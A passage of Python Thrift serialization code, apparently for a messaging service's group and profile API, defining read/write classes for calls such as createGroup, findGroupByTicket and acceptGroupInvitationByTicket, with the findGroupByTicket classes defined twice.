            oprot.writeFieldBegin('success', TType.LIST, 0)
            oprot.writeListBegin(TType.STRUCT, len(self.success))
            for iter1058 in self.success:
                iter1058.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getCompactGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )

    def __init__(self, groupId=None,):
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getCompactGroup_args')
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getCompactGroup_result(object):
    """
    Attributes:
     - success
     - e
    """

    thrift_spec = (
        (0, TType.STRUCT, 'success', (Group, Group.thrift_spec), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getCompactGroup_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class updateGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRUCT, 'group', [Group, None], None, ),  # 2
    )

    def __init__(self, reqSeq=None, group=None,):
        self.reqSeq = reqSeq
        self.group = group

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.group = Group()
                    self.group.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('updateGroup_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.group is not None:
            oprot.writeFieldBegin('group', TType.STRUCT, 2)
            self.group.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class updateGroup_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('updateGroup_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class findGroupByTicket_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'ticketId', 'UTF8', None, ),  # 1
    )

    def __init__(self, ticketId=None,):
        self.ticketId = ticketId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.ticketId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findGroupByTicket_args')
        if self.ticketId is not None:
            oprot.writeFieldBegin('ticketId', TType.STRING, 1)
            oprot.writeString(self.ticketId.encode('utf-8') if sys.version_info[0] == 2 else self.ticketId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class findGroupByTicket_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Group, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findGroupByTicket_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class reissueGroupTicket_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'groupMid', 'UTF8', None, ),  # 1
    )

    def __init__(self, groupMid=None,):
        self.groupMid = groupMid

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.groupMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('reissueGroupTicket_args')
        if self.groupMid is not None:
            oprot.writeFieldBegin('groupMid', TType.STRING, 1)
            oprot.writeString(self.groupMid.encode('utf-8') if sys.version_info[0] == 2 else self.groupMid)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class reissueGroupTicket_result(object):
    
    thrift_spec = (
        (0, TType.STRING, 'success', 'UTF8', None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRING:
                    self.success = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('reissueGroupTicket_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRING, 0)
            oprot.writeString(self.success.encode('utf-8') if sys.version_info[0] == 2 else self.success)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class acceptGroupInvitationByTicket_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'GroupMid', 'UTF8', None, ),  # 2
        (3, TType.STRING, 'ticketId', 'UTF8', None, ),  # 3
    )

    def __init__(self, reqSeq=None, GroupMid=None, ticketId=None,):
        self.reqSeq = reqSeq
        self.GroupMid = GroupMid
        self.ticketId = ticketId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.GroupMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.ticketId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('acceptGroupInvitationByTicket_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.GroupMid is not None:
            oprot.writeFieldBegin('GroupMid', TType.STRING, 2)
            oprot.writeString(self.GroupMid.encode('utf-8') if sys.version_info[0] == 2 else self.GroupMid)
            oprot.writeFieldEnd()
        if self.ticketId is not None:
            oprot.writeFieldBegin('ticketId', TType.STRING, 3)
            oprot.writeString(self.ticketId.encode('utf-8') if sys.version_info[0] == 2 else self.ticketId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class acceptGroupInvitationByTicket_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('acceptGroupInvitationByTicket_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupIdsJoined_args(object):
    
    thrift_spec = ()

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupIdsJoined_args')
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupIdsJoined_result(object):
    
    thrift_spec = (
        (0, TType.LIST, 'success', (TType.STRING, 'UTF8', False), None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.LIST:
                    self.success = []
                    (_etype1679, _size1676) = iprot.readListBegin()
                    for _i1680 in range(_size1676):
                        _elem1681 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.success.append(_elem1681)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupIdsJoined_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.LIST, 0)
            oprot.writeListBegin(TType.STRING, len(self.success))
            for iter1682 in self.success:
                oprot.writeString(iter1682.encode('utf-8') if sys.version_info[0] == 2 else iter1682)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupIdsInvited_args(object):

    thrift_spec = ()
    
    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupIdsInvited_args')
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupIdsInvited_result(object):
    
    thrift_spec = (
        (0, TType.LIST, 'success', (TType.STRING, 'UTF8', False), None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.LIST:
                    self.success = []
                    (_etype1672, _size1669) = iprot.readListBegin()
                    for _i1673 in range(_size1669):
                        _elem1674 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.success.append(_elem1674)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupIdsInvited_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.LIST, 0)
            oprot.writeListBegin(TType.STRING, len(self.success))
            for iter1675 in self.success:
                oprot.writeString(iter1675.encode('utf-8') if sys.version_info[0] == 2 else iter1675)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class createGroup_args(object):

    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'seq', None, None, ),  # 1
        (2, TType.STRING, 'name', 'UTF8', None, ),  # 2
        (3, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, seq=None, name=None, contactIds=None,):
        self.seq = seq
        self.name = name
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.seq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.name = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype833, _size830) = iprot.readListBegin()
                    for _i834 in range(_size830):
                        _elem835 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem835)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('createGroup_args')
        if self.seq is not None:
            oprot.writeFieldBegin('seq', TType.I32, 1)
            oprot.writeI32(self.seq)
            oprot.writeFieldEnd()
        if self.name is not None:
            oprot.writeFieldBegin('name', TType.STRING, 2)
            oprot.writeString(self.name.encode('utf-8') if sys.version_info[0] == 2 else self.name)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 3)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter836 in self.contactIds:
                oprot.writeString(iter836.encode('utf-8') if sys.version_info[0] == 2 else iter836)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class createGroup_result(object):
    """
    Attributes:
     - success
     - e
    """

    thrift_spec = (
        (0, TType.STRUCT, 'success', (Group, Group.thrift_spec), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('createGroup_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class updateProfile_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRUCT, 'profile', [Profile, None], None, ),  # 2
    )

    def __init__(self, reqSeq=None, profile=None,):
        self.reqSeq = reqSeq
        self.profile = profile

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.profile = Profile()
                    self.profile.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('updateProfile_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.profile is not None:
            oprot.writeFieldBegin('profile', TType.STRUCT, 2)
            self.profile.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class updateProfile_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('updateProfile_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class rejectGroupInvitation_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )

    def __init__(self, reqSeq=None, groupId=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('rejectGroupInvitation_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class rejectGroupInvitation_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('rejectGroupInvitation_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class findGroupByTicket_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'ticketId', 'UTF8', None, ),  # 1
    )

    def __init__(self, ticketId=None,):
        self.ticketId = ticketId

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.ticketId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findGroupByTicket_args')
        if self.ticketId is not None:
            oprot.writeFieldBegin('ticketId', TType.STRING, 1)
            oprot.writeString(self.ticketId.encode('utf-8') if sys.version_info[0] == 2 else self.ticketId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class findGroupByTicket_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Group, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
